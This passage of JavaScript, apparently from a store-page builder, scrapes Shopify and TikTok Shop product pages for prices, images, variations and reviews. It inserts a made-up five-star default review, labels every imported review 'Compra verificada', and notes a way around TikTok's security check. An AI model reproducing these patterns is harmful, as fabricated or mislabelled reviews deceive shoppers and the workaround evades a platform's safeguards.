        <div style="display:flex; gap:4px; flex-wrap:wrap;">
            <input type="text" class="rec-rev-img rec-rev-img-1" placeholder="Foto 1" value="${ri1}" style="flex:1; min-width:80px; font-size:11px;">
            <input type="text" class="rec-rev-img-2" placeholder="Foto 2" value="${ri2}" style="flex:1; min-width:80px; font-size:11px;">
            <input type="text" class="rec-rev-img-3" placeholder="Foto 3" value="${ri3}" style="flex:1; min-width:80px; font-size:11px;">
            <input type="text" class="rec-rev-img-4" placeholder="Foto 4" value="${ri4}" style="flex:1; min-width:80px; font-size:11px;">
            <input type="text" class="rec-rev-img-5" placeholder="Foto 5" value="${ri5}" style="flex:1; min-width:80px; font-size:11px;">
        </div>
    `;
    container.appendChild(item);
    return item;
}

function addRecommendation(data = null) {
  const container = el("recommendation-items");
  const addButton = container.querySelector("#main-add-rec-btn");
  const recCount = container.querySelectorAll(".item-editor").length + 1;
  const price = (19.9 + (recCount - 1) * 5).toFixed(2).replace(".", ",");

  const defaultData = {
    productTitle: `Produto Recomendado ${recCount}`,
    currentPrice: price,
    mainImage: `https://placehold.co/200x200/333/fff?text=Prod+${recCount}`,
    productUrl: `rec-${Date.now()}`,
    colors: [], sizes: [], 
    reviews: [], 
    variation1Title: "Cor", variation2Title: "Tamanho",
    originalPrice: "", 
    productDescription: "Descrição do produto recomendado...", 
  };

  const recData = { ...defaultData, ...data };
  if (!recData.originalPrice && recData.currentPrice) recData.originalPrice = recData.currentPrice;
  if (recData.colors) recData.colors = recData.colors.map((c) => normalizeColorObject(c, recData.mainImage || '', recData.currentPrice || '', recData.originalPrice || recData.currentPrice || ''));

  const displayTitle = recData.productTitle || recData.title;
  const displayPrice = recData.currentPrice || recData.price;
  const displayImage = recData.mainImage || recData.image;
  const displayLink = recData.productUrl || `rec-${Date.now()}`; 

  const item = document.createElement("div");
  item.className = "item-editor";
  item.style.borderLeft = "4px solid #000"; 
  item.dataset.productData = JSON.stringify(recData);

  // NOTA: Removi as variáveis 'const newItem' de dentro do HTML para evitar conflitos de escopo
  item.innerHTML = `
        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom: 10px; background:#f5f5f5; padding:8px; border-radius:4px;">
            <h4 style="margin:0; font-size:14px;">📦 Recomendação #${recCount}</h4>
            <button class="remove-btn" onclick="this.parentElement.parentElement.remove(); updateOutputDebounced();">Remover</button>
        </div>
        
        <div class="item-editor-grid">
            <img src="${displayImage}" alt="${displayTitle}" style="grid-row: span 3; height: 100%; object-fit: cover;">
            <div class="details">
                <label style="font-size:10px; font-weight:bold; color:#666;">INFORMAÇÕES BÁSICAS</label>
                <input type="text" class="rec-title" placeholder="Título do Produto" value="${displayTitle}">
                <div style="display:flex; gap:5px;">
                    <input type="text" class="rec-price" placeholder="Preço" value="${displayPrice}">
                    <input type="text" class="rec-original-price" placeholder="Preço Original" value="${recData.originalPrice || ''}">
                </div>
                <input type="text" class="rec-image" placeholder="URL Imagem Principal" value="${displayImage}">
                <input type="text" class="rec-link" placeholder="ID Único (ex: bone-preto)" value="${displayLink}">
            </div>
        </div>

        <div style="margin-top:15px;">
            <label style="font-weight:bold; font-size:12px;">Descrição do Produto</label>
            <textarea class="rec-description" placeholder="Cole a descrição completa aqui..." style="width:100%; height:60px; margin-top:5px; font-size:12px;">${recData.productDescription || ''}</textarea>
        </div>

        <div class="rec-variations" style="margin-top:15px; background:#fafafa; padding:10px; border-radius:5px; border:1px solid #eee;">
            <h5 style="margin-top:0; font-size:13px;">Variações (Cores e Tamanhos)</h5>
            
            <div style="display:flex; gap:10px; align-items:center; margin-bottom:5px;">
                <input type="text" class="rec-variation1-title" placeholder="Título (Ex: Cor)" value="${recData.variation1Title || "Cor"}" style="width:40%;">
                <button class="add-btn" style="padding:4px 8px; font-size:11px;" onclick="setupLiveUpdateListeners(addRecColor(this)); updateOutputDebounced();">+ Opção</button>
            </div>
            <div class="rec-color-options" style="margin-bottom:15px;"></div>
            
            <div style="display:flex; gap:10px; align-items:center; margin-bottom:5px;">
                <input type="text" class="rec-variation2-title" placeholder="Título (Ex: Tamanho)" value="${recData.variation2Title || "Tamanho"}" style="width:40%;">
                <button class="add-btn" style="padding:4px 8px; font-size:11px;" onclick="setupLiveUpdateListeners(addRecSize(this)); updateOutputDebounced();">+ Opção</button>
            </div>
            <div class="rec-size-options"></div>
        </div>

        <div style="margin-top:15px; border-top:1px solid #eee; padding-top:10px;">
             <h5 style="margin-top:0; font-size:13px;">Avaliações deste Produto</h5>
             <div class="rec-reviews-container"></div>
             <button class="add-btn" style="background:#444; color:white; width:100%; font-size:12px; margin-top:5px;" onclick="setupLiveUpdateListeners(addRecReview(this)); updateOutputDebounced();">Adicionar Avaliação Manual</button>
        </div>
  `;

  if (addButton) container.insertBefore(item, addButton); else container.appendChild(item);

  // Preencher Cores existentes
  if (recData.colors && recData.colors.length > 0) {
    const addColorBtn = item.querySelector('.rec-variations button[onclick*="addRecColor"]');
    recData.colors.forEach((color) => addRecColor(addColorBtn, color));
  }
  // Preencher Tamanhos existentes
  if (recData.sizes && recData.sizes.length > 0) {
    const addSizeBtn = item.querySelector('.rec-variations button[onclick*="addRecSize"]');
    recData.sizes.forEach((size) => {
      // Aceita tanto string quanto objeto {name: "P"}
      const sizeName = typeof size === 'string' ? size : (size && size.name ? size.name : String(size));
      addRecSize(addSizeBtn, sizeName);
    });
  }
  
  // Preencher Reviews existentes
  const reviewsContainerBtn = item.querySelector('.add-btn[onclick*="addRecReview"]');
  if (recData.reviews && recData.reviews.length > 0) {
      recData.reviews.forEach(rev => addRecReview(reviewsContainerBtn, rev));
  } else {
      addRecReview(reviewsContainerBtn, {name: "Maria Silva", stars: 5, text: "Amei o produto, chegou rápido!", details: "Padrão"});
  }

  setupLiveUpdateListeners(item);
  updateOutputDebounced();
  return item;
}


function isShopifyProductUrl(url) {
  try {
    const u = new URL(String(url || '').trim());
    return /\/products\//i.test(u.pathname);
  } catch (e) {
    return /\/products\//i.test(String(url || ''));
  }
}

function isTikTokShopUrl(url) {
  try {
    const u = new URL(String(url || '').trim());
    // URLs do TikTok Shop: tiktok.com/view/product/ID ou shop.tiktok.com/view/product/ID
    return (u.hostname.includes('tiktok.com') && /\/view\/product\/\d+/i.test(u.pathname)) ||
           (u.hostname.includes('tiktok.com') && /\/product\/\d+/i.test(u.pathname));
  } catch (e) {
    return /tiktok\.com.*\/product\/\d+/i.test(String(url || ''));
  }
}

function extractTikTokProductId(url) {
  const match = String(url || '').match(/\/(?:view\/)?product\/(\d+)/i);
  return match ? match[1] : null;
}

// Extrair dados do og_info da URL do TikTok (metodo principal para evitar security check)
function extractTikTokDataFromUrl(url) {
  try {
    const u = new URL(String(url || '').trim());
    
    // Tentar extrair do parametro og_info (JSON com dados do produto)
    const ogInfoParam = u.searchParams.get('og_info');
    let ogInfo = null;
    
    if (ogInfoParam) {
      try {
        ogInfo = JSON.parse(decodeURIComponent(ogInfoParam));
      } catch (e) {
        // Tentar decodificar unicode escapes manualmente
        let decoded = decodeURIComponent(ogInfoParam);
        decoded = decoded.replace(/\\u([0-9a-fA-F]{4})/g, (m, g) => String.fromCharCode(parseInt(g, 16)));
        try { ogInfo = JSON.parse(decoded); } catch (e2) {}
      }
    }
    
    // Tentar extrair do parametro title (backup)
    const titleParam = u.searchParams.get('title');
    
    let title = '';
    let imageUrl = '';
    let description = '';
    
    if (ogInfo) {
      title = ogInfo.title || '';
      description = ogInfo.description || '';
      imageUrl = ogInfo.image || '';
      
      // Decodificar unicode escapes na URL da imagem
      if (imageUrl) {
        imageUrl = imageUrl.replace(/\\u([0-9a-fA-F]{4})/g, (m, g) => String.fromCharCode(parseInt(g, 16)));
      }
    }
    
    // Fallback: usar parametro title
    if (!title && titleParam) {
      title = decodeURIComponent(titleParam);
    }
    
    // Tentar extrair imagem do parametro image ou share_image
    if (!imageUrl) {
      const imgParam = u.searchParams.get('image') || u.searchParams.get('share_image');
      if (imgParam) {
        imageUrl = decodeURIComponent(imgParam);
        imageUrl = imageUrl.replace(/\\u([0-9a-fA-F]{4})/g, (m, g) => String.fromCharCode(parseInt(g, 16)));
      }
    }
    
    // Se ainda nao temos titulo, nao podemos continuar
    if (!title) return null;
    
    imageUrl = cleanTikTokImageUrl(imageUrl);
    
    return {
      title: title,
      price: '0,00',
      oldPrice: '',
      imageUrl: imageUrl,
      description: description,
      productTitle: title,
      currentPrice: '0,00',
      originalPrice: '',
      mainImage: imageUrl,
      additionalImages: [],
      productDescription: description,
      rawDescriptionHtml: '',
      descriptionImages: [],
      descriptionBlocks: [],
      productRating: '',
      reviewCount: '',
      salesCount: '',
      storeName: '',
      storeLogoUrl: '',
      colors: [],
      sizes: [],
      reviews: []
    };
  } catch (e) {
    return null;
  }
}

function parseTikTokShopData(doc, url) {
  try {
    // TikTok Shop armazena dados no script __MODERN_ROUTER_DATA__
    const scriptEl = doc.querySelector('#__MODERN_ROUTER_DATA__');
    if (!scriptEl) return null;
    
    const jsonData = JSON.parse(scriptEl.textContent);
    const loaderData = jsonData?.loaderData;
    if (!loaderData) return null;
    
    // Os dados do produto estao em diferentes caminhos possiveis
    let productData = null;
    let reviewData = null;
    let shopInfo = null;
    
    // Percorrer loaderData para encontrar os dados
    for (const key of Object.keys(loaderData)) {
      const val = loaderData[key];
      if (val && typeof val === 'object') {
        // Buscar productDetail ou getProductDetail
        if (val.productDetail) productData = val.productDetail;
        if (val.getProductDetail) productData = val.getProductDetail;
        if (val.getProductUGPacker?.productDetail) productData = val.getProductUGPacker.productDetail;
        
        // Buscar reviews
        if (val.getProductReviewInfo) reviewData = val.getProductReviewInfo;
        if (val.productReviewInfo) reviewData = val.productReviewInfo;
        
        // Buscar info da loja
        if (val.getShopInfo) shopInfo = val.getShopInfo;
        if (val.shopInfo) shopInfo = val.shopInfo;
      }
    }
    
    if (!productData) return null;
    
    // Extrair dados do produto
    const title = productData.title || productData.name || '';
    const description = productData.description || productData.desc || '';
    
    // Extrair precos
    let currentPrice = '0,00';
    let originalPrice = '';
    if (productData.price) {
      currentPrice = formatTikTokPrice(productData.price.discountPrice || productData.price.salePrice || productData.price.price);
      originalPrice = productData.price.originalPrice ? formatTikTokPrice(productData.price.originalPrice) : '';
    } else if (productData.discountPrice || productData.salePrice) {
      currentPrice = formatTikTokPrice(productData.discountPrice || productData.salePrice);
      originalPrice = productData.originalPrice ? formatTikTokPrice(productData.originalPrice) : '';
    }
    
    // Extrair imagens
    const images = [];
    if (productData.images && Array.isArray(productData.images)) {
      productData.images.forEach(img => {
        const imgUrl = typeof img === 'string' ? img : (img.url || img.src || img.uri || '');
        if (imgUrl) images.push(cleanTikTokImageUrl(imgUrl));
      });
    }
    if (productData.mainImage) images.unshift(cleanTikTokImageUrl(productData.mainImage));
    if (productData.cover) images.unshift(cleanTikTokImageUrl(productData.cover));
    
    // Extrair variacoes (cores/tamanhos)
    const colors = [];
    const sizes = [];
    if (productData.skus && Array.isArray(productData.skus)) {
      productData.skus.forEach(sku => {
        if (sku.properties && Array.isArray(sku.properties)) {
          sku.properties.forEach(prop => {
            const propName = (prop.name || prop.propertyName || '').toLowerCase();
            const propValue = prop.value || prop.propertyValue || '';
            if (propName.includes('cor') || propName.includes('color') || propName.includes('colour')) {
              if (propValue && !colors.find(c => c.name === propValue)) {
                colors.push({ name: propValue, imageUrl: sku.image || '', price: '' });
              }
            } else if (propName.includes('tamanho') || propName.includes('size') || propName.includes('tam')) {
              if (propValue && !sizes.includes(propValue)) sizes.push(propValue);
            }
          });
        }
      });
    }
    if (productData.options && Array.isArray(productData.options)) {
      productData.options.forEach(opt => {
        const optName = (opt.name || '').toLowerCase();
        if (opt.values && Array.isArray(opt.values)) {
          opt.values.forEach(val => {
            const valName = typeof val === 'string' ? val : (val.name || val.value || '');
            if (optName.includes('cor') || optName.includes('color')) {
              if (valName && !colors.find(c => c.name === valName)) {
                colors.push({ name: valName, imageUrl: val.image || '', price: '' });
              }
            } else if (optName.includes('tamanho') || optName.includes('size')) {
              if (valName && !sizes.includes(valName)) sizes.push(valName);
            }
          });
        }
      });
    }
    
    // Extrair avaliacoes
    const reviews = [];
    let rating = '';
    let reviewCount = '';
    let salesCount = '';
    
    if (reviewData) {
      rating = reviewData.averageRating || reviewData.rating || '';
      reviewCount = reviewData.totalReviewCount || reviewData.reviewCount || reviewData.total || '';
      
      if (reviewData.reviews && Array.isArray(reviewData.reviews)) {
        reviewData.reviews.slice(0, 10).forEach(r => {
          reviews.push({
            author: r.userName || r.user?.name || r.nickname || 'Usuario',
            rating: r.rating || r.score || 5,
            text: r.content || r.comment || r.text || '',
            date: r.createTime || r.date || '',
            images: (r.images || []).map(img => typeof img === 'string' ? img : (img.url || ''))
          });
        });
      }
    }
    
    // Extrair vendas
    if (productData.soldCount) salesCount = String(productData.soldCount);
    if (productData.salesCount) salesCount = String(productData.salesCount);
    if (productData.sold) salesCount = String(productData.sold);
    
    // Extrair info da loja
    let storeName = '';
    let storeLogoUrl = '';
    if (shopInfo) {
      storeName = shopInfo.shopName || shopInfo.name || '';
      storeLogoUrl = shopInfo.logo || shopInfo.avatar || '';
    }
    if (productData.seller) {
      storeName = storeName || productData.seller.name || productData.seller.shopName || '';
      storeLogoUrl = storeLogoUrl || productData.seller.logo || productData.seller.avatar || '';
    }
    
    return {
      title,
      price: currentPrice,
      oldPrice: originalPrice,
      imageUrl: images[0] || '',
      description,
      productTitle: title,
      currentPrice,
      originalPrice,
      mainImage: images[0] || '',
      additionalImages: images.slice(1),
      productDescription: description,
      rawDescriptionHtml: description,
      descriptionImages: [],
      descriptionBlocks: [],
      productRating: rating,
      reviewCount,
      salesCount,
      storeName,
      storeLogoUrl,
      colors,
      sizes,
      reviews
    };
  } catch (e) {
    console.warn('Erro ao parsear TikTok Shop JSON:', e);
    return null;
  }
}

function formatTikTokPrice(price) {
  if (!price) return '0,00';
  // TikTok pode retornar preco em centavos ou ja formatado
  let num = typeof price === 'number' ? price : parseFloat(String(price).replace(/[^\d.,]/g, '').replace(',', '.'));
  if (isNaN(num)) return '0,00';
  // Se o numero for muito grande, provavelmente esta em centavos
  if (num > 10000) num = num / 100;
  return num.toFixed(2).replace('.', ',');
}

function cleanTikTokImageUrl(url) {
  if (!url) return '';
  let clean = String(url).trim();
  // Remover parametros de resize para pegar imagem em alta qualidade
  clean = clean.replace(/~tplv-[^?]+/g, '');
  // Garantir protocolo
  if (clean.startsWith('//')) clean = 'https:' + clean;
  return clean;
}

function extractTikTokDataFromHtml(doc) {
  // Metodo alternativo: extrair dados direto do HTML quando JSON nao disponivel
  try {
    // Titulo
    const titleEl = doc.querySelector('h1, [data-testid="product-title"], .product-title');
    const title = titleEl ? titleEl.textContent.trim() : '';
    
    // Preco
    const priceEl = doc.querySelector('[data-testid="product-price"], .price-current, .sale-price');
    const currentPrice = priceEl ? priceEl.textContent.replace(/[^\d,]/g, '') : '0,00';
    
    // Imagem principal
    const mainImgEl = doc.querySelector('img[data-testid="product-image"], .product-image img, .swiper-slide img');
    const mainImage = mainImgEl ? (mainImgEl.src || mainImgEl.dataset.src || '') : '';
    
    // Imagens adicionais
    const additionalImages = [];
    doc.querySelectorAll('.swiper-slide img, .product-gallery img, [data-lazy-img] img').forEach(img => {
      const src = img.src || img.dataset.src || '';
      if (src && src !== mainImage && !additionalImages.includes(src)) {
        additionalImages.push(cleanTikTokImageUrl(src));
      }
    });
    
    // Descricao
    const descEl = doc.querySelector('.product-description, [data-testid="product-description"], .description-content');
    const description = descEl ? descEl.innerHTML : '';
    
    // Info da loja
    const storeNameEl = doc.querySelector('.shop-name, [data-testid="shop-name"], .seller-name');
    const storeName = storeNameEl ? storeNameEl.textContent.trim() : '';
    
    const storeLogoEl = doc.querySelector('.shop-logo img, .seller-avatar img');
    const storeLogoUrl = storeLogoEl ? (storeLogoEl.src || '') : '';
    
    // Vendas
    const salesEl = doc.querySelector('.sold-count, [data-testid="sold-count"], .sales-count');
    const salesCount = salesEl ? salesEl.textContent.replace(/[^\d]/g, '') : '';
    
    // Rating
    const ratingEl = doc.querySelector('.rating-score, [data-testid="rating"], .star-rating');
    const rating = ratingEl ? ratingEl.textContent.trim() : '';
    
    if (!title && !mainImage) return null;
    
    return {
      title,
      price: currentPrice,
      oldPrice: '',
      imageUrl: cleanTikTokImageUrl(mainImage),
      description,
      productTitle: title,
      currentPrice,
      originalPrice: '',
      mainImage: cleanTikTokImageUrl(mainImage),
      additionalImages,
      productDescription: description,
      rawDescriptionHtml: description,
      descriptionImages: [],
      descriptionBlocks: [],
      productRating: rating,
      reviewCount: '',
      salesCount,
      storeName,
      storeLogoUrl,
      colors: [],
      sizes: [],
      reviews: []
    };
  } catch (e) {
    console.warn('Erro ao extrair TikTok do HTML:', e);
    return null;
  }
}

function normalizeProductUrl(url) {
  let clean = String(url || '').trim();
  if (!clean) return '';
  clean = clean.split('#')[0];
  if (/\.js(\?.*)?$/i.test(clean)) clean = clean.replace(/\.js(\?.*)?$/i, '');
  return clean;
}

function buildShopifyProductJsonUrl(url) {
  const clean = normalizeProductUrl(url).split('?')[0];
  return clean.endsWith('/') ? `${clean}.js` : `${clean}.js`;
}

function absolutizeUrl(src, baseUrl) {
  let value = String(src || '').trim();
  if (!value) return '';
  if (value.startsWith('//')) return 'https:' + value;
  if (/^https?:\/\//i.test(value) || value.startsWith('data:')) return value;
  try {
    return new URL(value, baseUrl || window.location.href).href;
  } catch (e) {
    return value;
  }
}

function decodeHtmlEntities(str) {
  const txt = document.createElement('textarea');
  txt.innerHTML = str || '';
  return txt.value;
}

function htmlToPlainTextPreserveBreaks(html) {
  const div = document.createElement('div');
  div.innerHTML = decodeHtmlEntities(html || '');
  div.querySelectorAll('br').forEach(br => br.replaceWith('\n'));
  div.querySelectorAll('p, div, li, h1, h2, h3, h4, h5, h6').forEach(node => node.insertAdjacentText('beforeend', '\n'));
  return (div.textContent || div.innerText || '')
    .replace(/\n{3,}/g, '\n\n')
    .replace(/[ \t]+\n/g, '\n')
    .trim();
}

function normalizeColorObject(color, fallbackImage, fallbackPrice, fallbackOriginalPrice) {
  if (typeof color === 'string') {
    return {
      name: color,
      imageUrl: fallbackImage || '',
      price: fallbackPrice || '',
      originalPrice: fallbackOriginalPrice || fallbackPrice || '',
      checkoutUrl: ''
    };
  }
  const c = color && typeof color === 'object' ? color : {};
  return {
    name: c.name || '',
    imageUrl: c.imageUrl || fallbackImage || '',
    price: c.price || fallbackPrice || '',
    originalPrice: c.originalPrice || fallbackOriginalPrice || c.price || fallbackPrice || '',
    checkoutUrl: c.checkoutUrl || ''
  };
}


let importedDescriptionBlocksState = [];
let importedRawDescriptionHtml = '';

function sanitizeDescriptionTextBlock(text) {
  return String(text || '')
    .replace(/\u00A0/g, ' ')
    .replace(/[ \t]+\n/g, '\n')
    .replace(/\n{3,}/g, '\n\n')
    .trim();
}

function extractOrderedDescriptionBlocks(docOrHtml, baseUrl) {
  let scope = null;
  if (typeof docOrHtml === 'string') {
    const parser = new DOMParser();
    const tempDoc = parser.parseFromString(docOrHtml, 'text/html');
    scope = tempDoc.body || tempDoc;
  } else {
    scope = docOrHtml && (docOrHtml.body || docOrHtml);
  }
  if (!scope) return [];

  const containers = [
    '.product-meta__description',
    '.product__description',
    '.rte',
    '.product-description',
    '[itemprop="description"]',
    '.tab-content',
    '.accordion__content',
    '.collapsible__content',
    '.product-single__description'
  ];

  let root = null;
  for (const sel of containers) {
    const found = scope.querySelector ? scope.querySelector(sel) : null;
    if (found) {
      root = found;
      break;
    }
  }
  if (!root) root = scope;

  const blocks = [];
  let textBuffer = [];

  const pushText = () => {
    const value = sanitizeDescriptionTextBlock(textBuffer.join('\n'));
    if (value) blocks.push({ type: 'text', text: value });
    textBuffer = [];
  };

  const pushImage = (src) => {
    const finalSrc = absolutizeUrl(src, baseUrl);
    if (!finalSrc || /placehold\.co|placeholder/i.test(finalSrc)) return;
    pushText();
    blocks.push({ type: 'image', url: finalSrc });
  };

  const isBlockNode = (tag) => /^(P|DIV|SECTION|ARTICLE|UL|OL|LI|H1|H2|H3|H4|H5|H6|BLOCKQUOTE)$/i.test(tag || '');

  const walk = (node) => {
    if (!node) return;

    if (node.nodeType === Node.TEXT_NODE) {
      const txt = String(node.textContent || '').replace(/\s+/g, ' ').trim();
      if (txt) textBuffer.push(txt);
      return;
    }

    if (node.nodeType !== Node.ELEMENT_NODE) return;

    const tag = (node.tagName || '').toUpperCase();
    if (tag === 'IMG') {
      pushImage(node.getAttribute('src') || node.getAttribute('data-src') || node.getAttribute('data-original') || node.getAttribute('data-lazy-src') || '');
      return;
    }
    if (tag === 'BR') {
      textBuffer.push('\n');
      return;
    }
    if (/^(SCRIPT|STYLE|NOSCRIPT|IFRAME|SVG)$/.test(tag)) return;

    const children = Array.from(node.childNodes || []);
    if (!children.length) {
      const txt = String(node.textContent || '').replace(/\s+/g, ' ').trim();
      if (txt) textBuffer.push(txt);
      if (isBlockNode(tag)) textBuffer.push('\n');
      return;
    }

    children.forEach(walk);
    if (isBlockNode(tag)) textBuffer.push('\n');
  };

  Array.from(root.childNodes || []).forEach(walk);
  pushText();

  const deduped = [];
  const seenImages = new Set();
  for (const block of blocks) {
    if (block.type === 'image') {
      if (seenImages.has(block.url)) continue;
      seenImages.add(block.url);
      deduped.push(block);
      continue;
    }
    if (block.type === 'text' && block.text) {
      if (deduped.length && deduped[deduped.length - 1].type === 'text') {
        deduped[deduped.length - 1].text = sanitizeDescriptionTextBlock(deduped[deduped.length - 1].text + '\n\n' + block.text);
      } else {
        deduped.push(block);
      }
    }
  }

  return deduped;
}

// Converte texto plano de descricao em HTML bem formatado e bonito
function beautifyDescriptionText(text) {
  if (!text || !text.trim()) return '';

  // Se ja tiver tags HTML, nao reformatar
  if (/<(p|div|ul|li|h[1-6]|br)\b/i.test(text)) {
    return '<div class="desc-rich">' + text + '</div>';
  }

  const esc = (s) => String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');

  // Normaliza quebras e separa em linhas
  const lines = text.replace(/\r/g, '').split('\n').map((l) => l.trim()).filter((l) => l.length > 0);
  if (lines.length === 0) return '';

  // Detecta se a linha comeca com emoji (inicio de secao)
  const emojiStart = /^[\u{1F000}-\u{1FAFF}\u{2600}-\u{27BF}\u{2190}-\u{21FF}\u{2B00}-\u{2BFF}\u{FE0F}\u{1F900}-\u{1F9FF}]/u;
  // Detecta item de lista (·, •, -, *, ► etc.)
  const bulletStart = /^[·•▪◦‣\-\*►]\s*/;

  let html = '';
  let listOpen = false;
  const closeList = () => { if (listOpen) { html += '</ul>'; listOpen = false; } };

  lines.forEach((line, idx) => {
    // Primeira linha = nome do produto (titulo destacado)
    if (idx === 0 && line.length < 90 && !bulletStart.test(line) && !emojiStart.test(line)) {
      closeList();
      html += '<p class="desc-product-name">' + esc(line) + '</p>';
      return;
    }

    // Linha de lista (bullet)
    if (bulletStart.test(line)) {
      if (!listOpen) { html += '<ul class="desc-list">'; listOpen = true; }
      let item = line.replace(bulletStart, '').trim();
      // Negrito antes do ":" (ex: "Acido Fitico: promove...")
      const ci = item.indexOf(':');
      if (ci > 0 && ci < 45) {
        html += '<li><strong>' + esc(item.substring(0, ci)) + ':</strong>' + esc(item.substring(ci + 1)) + '</li>';
      } else {
        html += '<li>' + esc(item) + '</li>';
      }
      return;
    }

    closeList();

    // Cabecalho de secao: comeca com emoji OU termina com ":" e e curto
    const isHeader = emojiStart.test(line) || (line.endsWith(':') && line.length < 60);
    if (isHeader) {
      html += '<p class="desc-subtitle">' + esc(line) + '</p>';
      return;
    }

    // Paragrafo normal
    html += '<p class="desc-paragraph">' + esc(line) + '</p>';
  });

  closeList();
  return '<div class="desc-rich">' + html + '</div>';
}

// Detecta se uma URL e de video (TikTok CDN usa mp4 / video_mp4 / /video/tos/)
function isDescriptionVideoUrl(url) {
  if (!url) return false;
  return /\.mp4(\?|$)/i.test(url) || /mime_type=video|video_mp4|\/video\/tos\//i.test(url);
}

// Renderiza uma URL de midia da descricao como <video> (se for video) ou <img>
function renderDescriptionMediaTag(url) {
  if (!url) return '';
  if (isDescriptionVideoUrl(url)) {
    var posterUrl = url.indexOf('#') === -1 ? url + '#t=0.1' : url;
    return `<video src="${posterUrl}" controls playsinline muted preload="metadata" style="width:100%;height:auto;display:block;background:#000;" alt="Video Detalhe do Produto"></video>`;
  }
  return `<img src="${url}" alt="Imagem Detalhe do Produto">`;
}

function renderDescriptionBlocksHTML(descriptionBlocks, fallbackDescriptionImages, fallbackText, rawDescriptionHtml = '') {
  // Se tiver HTML bruto da descricao original, usar ele diretamente para manter formatacao
  if (rawDescriptionHtml && rawDescriptionHtml.trim()) {
    // Limpar e sanitizar o HTML mas manter a estrutura e formatacao
    const cleanHtml = rawDescriptionHtml
      .replace(/<script[^>]*>[\s\S]*?<\/script>/gi, '')
      .replace(/<style[^>]*>[\s\S]*?<\/style>/gi, '')
      .replace(/on\w+="[^"]*"/gi, '')
      .replace(/on\w+='[^']*'/gi, '');
    return `<div class="shopify-description-content">${cleanHtml}</div>`;
  }

  if (Array.isArray(descriptionBlocks) && descriptionBlocks.length) {
    return descriptionBlocks.map((block) => {
      if (!block || typeof block !== 'object') return '';
      if (block.type === 'video' && block.url) {
        return renderDescriptionMediaTag(block.url);
      }
      if (block.type === 'image' && block.url) {
        return renderDescriptionMediaTag(block.url);
      }
      if (block.type === 'text' && block.text) {
        return beautifyDescriptionText(block.text);
      }
      return '';
    }).join('');
  }

  const descriptionImagesHTML = (fallbackDescriptionImages || []).map((url) => renderDescriptionMediaTag(url)).join('');
  const descriptionTextHTML = fallbackText ? beautifyDescriptionText(fallbackText) : '';
  return descriptionImagesHTML + descriptionTextHTML;
}

function extractDescriptionImagesFromHtml(docOrHtml, baseUrl) {
  const urls = new Set();
  let scope = null;
  if (typeof docOrHtml === 'string') {
    const parser = new DOMParser();
    const tempDoc = parser.parseFromString(docOrHtml, 'text/html');
    scope = tempDoc.body || tempDoc;
  } else {
    scope = docOrHtml && (docOrHtml.body || docOrHtml);
  }
  if (!scope) return [];

  const selectors = [
    '.product-meta__description img',
    '.product__description img',
    '.rte img',
    '.product-description img',
    '[itemprop="description"] img',
    '.tab-content img',
    '.accordion__content img',
    '.collapsible__content img',
    '.product-single__description img',
    'img'
  ];

  selectors.forEach(sel => {
    scope.querySelectorAll(sel).forEach(img => {
      let src = img.getAttribute('src') || img.getAttribute('data-src') || img.getAttribute('data-original') || img.getAttribute('data-lazy-src') || '';
      src = absolutizeUrl(src, baseUrl);
      if (src && !/placehold\.co|placeholder/i.test(src)) urls.add(src);
    });
  });

  return Array.from(urls);
}

function extractDescriptionHtml(doc) {
  const selectors = [
    '.product-meta__description',
    '.product__description',
    '.product-description',
    '.product-single__description',
    '.product__info-container .rte',
    '.product-info__description',
    '.product-info-description',
    '.product-form__description',
    '[data-product-description]',
    '[itemprop="description"]',
    '.rte',
    '.description-content',
    '.tab-content .rte',
    '.tab-content',
    '.accordion__content',
    '.collapsible__content',
    '.product-details__description',
    '#product-description',
    '.ProductMeta__Description',
    '.product-block--description'
  ];
  for (const sel of selectors) {
    const found = doc.querySelector(sel);
    if (found && found.innerHTML && found.innerHTML.trim().length > 50) {
      // Retorna o HTML completo preservando toda formatacao
      return found.innerHTML.trim();
    }
  }
  // Fallback: procurar qualquer elemento com conteudo substancial
  for (const sel of selectors) {
    const found = doc.querySelector(sel);
    if (found && found.innerHTML && found.innerHTML.trim()) {
      return found.innerHTML.trim();
    }
  }
  return '';
}

function extractReviewDataFromHtml(doc) {
  let rating = '';
  let reviewCount = '';
  let reviews = [];
  const asText = (v) => String(v || '').trim();

  const jd = doc.querySelector('[data-average-rating], .jdgm-prev-badge, .jdgm-widget');
  if (jd) {
    rating = asText(jd.getAttribute('data-average-rating') || jd.getAttribute('data-rating') || rating);
    reviewCount = asText(jd.getAttribute('data-number-of-reviews') || jd.getAttribute('data-reviews-count') || reviewCount);
  }
  const loox = doc.querySelector('[data-rating], .loox-rating');
  if (loox) {
    rating = rating || asText(loox.getAttribute('data-rating'));
    reviewCount = reviewCount || asText(loox.getAttribute('data-raters'));
  }

  const ratingMeta = doc.querySelector('meta[itemprop="ratingValue"]');
  const reviewMeta = doc.querySelector('meta[itemprop="reviewCount"], meta[itemprop="ratingCount"]');
  if (ratingMeta && !rating) rating = asText(ratingMeta.getAttribute('content'));
  if (reviewMeta && !reviewCount) reviewCount = asText(reviewMeta.getAttribute('content'));

  Array.from(doc.querySelectorAll('script[type="application/ld+json"]')).forEach(script => {
    const txt = (script.textContent || '').trim();
    if (!txt) return;
    try {
      const parsed = JSON.parse(txt);
      const items = Array.isArray(parsed) ? parsed : [parsed];
      items.forEach(item => {
        if (!item || typeof item !== 'object') return;
        if (item.aggregateRating) {
          if (!rating && item.aggregateRating.ratingValue != null) rating = asText(item.aggregateRating.ratingValue);
          if (!reviewCount && (item.aggregateRating.reviewCount != null || item.aggregateRating.ratingCount != null)) {
            reviewCount = asText(item.aggregateRating.reviewCount ?? item.aggregateRating.ratingCount);
          }
        }
        if (Array.isArray(item.review)) {
          item.review.slice(0, 8).forEach(r => reviews.push({
            name: asText(r?.author?.name || 'Cliente'),
            avatarUrl: '',
            details: 'Compra verificada',
            stars: Number(r?.reviewRating?.ratingValue || 5),
            text: asText(r?.reviewBody || ''),
            image: ''
          }));
        }
      });
    } catch (e) {}
  });

  return { rating, reviewCount, reviews: reviews.filter(r => r.text).slice(0, 8) };
}

function extractShopifyJsonFromHtml(doc) {
  const byId = doc.querySelector('script[type="application/json"][id*="ProductJson"], script[type="application/json"][data-product-json]');
  if (byId && byId.textContent.trim()) {
    try { return JSON.parse(byId.textContent); } catch (e) {}
  }

